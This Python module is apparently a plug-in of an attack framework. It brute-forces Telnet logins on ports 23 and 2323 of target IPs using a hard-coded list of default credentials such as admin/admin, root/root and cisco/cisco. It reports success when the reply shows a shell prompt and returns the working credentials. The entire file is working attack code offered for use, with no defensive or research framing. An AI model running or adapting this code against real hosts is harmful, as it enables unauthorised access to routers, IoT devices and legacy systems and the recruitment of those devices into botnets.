"""
Telnet Exploit Module
Exploits Telnet protocol vulnerabilities
"""

import socket
import telnetlib
from typing import Dict, Tuple

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Telnet_Exploit(BaseExploit):
    """
    Telnet Brute Force Exploit
    Targets: Legacy systems with Telnet (port 23)
    """
    
    def __init__(self):
        super().__init__(
            name="Telnet_BruteForce",
            target_ports=[23, 2323],
            target_os=["Windows", "Linux", "Unix", "Network Device"]
        )
        
        self.telnet_credentials = [
            ("admin", "admin"),
            ("root", "root"),
            ("admin", "password"),
            ("admin", ""),
            ("", ""),
            ("cisco", "cisco"),
            ("admin", "1234"),
            ("user", "user"),
        ]
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if Telnet is accessible"""
        ip = target['ip']
        
        ports = [23, 2323]
        for port in ports:
            if port in target.get('open_ports', []):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    
                    if result == 0:
                        logger.debug(f"Telnet port {port} accessible on {ip}")
                        return True
                except Exception as e:
                    logger.debug(f"Telnet check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Telnet brute force"""
        ip = target['ip']
        port = 23 if 23 in target.get('open_ports', []) else 2323
        
        logger.info(f"Attempting Telnet brute force on {ip}:{port}")
        
        try:
            for username, password in self.telnet_credentials:
                logger.debug(f"Trying Telnet: {username}:{password}")
                
                if self._try_telnet_login(ip, port, username, password):
                    self.stats['success'] += 1
                    logger.success(f"Telnet access gained on {ip} with {username}:{password}")
                    
                    return True, {
                        'method': 'Telnet_BruteForce',
                        'credentials': f"{username}:{password}",
                        'port': port,
                        'service': 'Telnet'
                    }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Telnet exploit error on {ip}: {e}")
            return False, {}
    
    def _try_telnet_login(self, ip: str, port: int, username: str, password: str) -> bool:
        """Try Telnet login"""
        try:
            tn = telnetlib.Telnet(ip, port, timeout=5)
            
            # Wait for login prompt
            tn.read_until(b"login: ", timeout=3)
            tn.write(username.encode('ascii') + b"\n")
            
            # Wait for password prompt
            tn.read_until(b"Password: ", timeout=3)
            tn.write(password.encode('ascii') + b"\n")
            
            # Check if login successful
            response = tn.read_some()
            tn.close()
            
            # Look for success indicators
            if b"$" in response or b"#" in response or b">" in response:
                return True
            
            return False
            
        except:
            return False
